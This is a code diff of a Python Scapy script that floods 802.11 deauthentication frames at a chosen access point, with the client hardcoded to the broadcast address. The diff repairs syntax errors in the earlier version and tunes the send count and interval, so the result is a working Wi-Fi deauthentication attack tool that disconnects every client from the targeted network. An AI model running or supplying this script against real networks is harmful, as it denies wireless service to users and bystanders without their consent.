@@ -13,24 +13,15 @@ from scapy.all import *
 conf.iface = sys.argv[1] # The interface that you want to send packets out of, needs to be set to monitor mode
 bssid = sys.argv[2] # The BSSID of the Wireless Access Point you want to target
 #client = sys.argv[3] # The MAC address of the Client you want to kick off the Access Point
-client = FF:FF:FF:FF:FF:FF
-count = sys.argv[4] # The number of deauth packets you want to send
+client = "FF:FF:FF:FF:FF:FF"
+sendcount = sys.argv[4] # The number of deauth packets you want to send
 
 conf.verb = 0
 
-packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client,addr2=bssid,addr3=bssid)/Dot11Deauth(reason=7)
-packet2 = Dot11/(addr1=client,addr2=bssid,addr3=bssid)/Dot11Deauth()
-packet3 = Dot11/(addr1=bssid,addr2=client,addr3=client)/Dot11Deauth()
-packet4 = Dot11(addr1=client,addr2=bssid,addr3=bssid)/Dot11Deauth()
-packet5 = Dot11(addr1=bssid,addr2=client,addr3=client)/Dot11Deauth()
+packet = RadioTap() / Dot11(type=0,subtype=12,addr1=client,addr2=bssid,addr3=bssid)/Dot11Deauth(reason=7)
+packet2 = RadioTap() / Dot11(addr1=client,addr2=bssid,addr3=bssid)/Dot11Deauth()
 
-
-for n in range(int(count)):
-	sendp(packet)
-	sendp(packet2)
-	sendp(packet3)
-	sendp(packet4)
-	sendp(packet5)
+for n in range(int(sendcount)):
+	sendp(packet, iface=conf.iface, count = 5, inter = .2)
+	sendp(packet2, iface=conf.iface, count = 5, inter = .2)
 	print 'Deauth sent via: ' + conf.iface + ' to BSSID: ' + bssid + ' for Client: ' + client
-
-
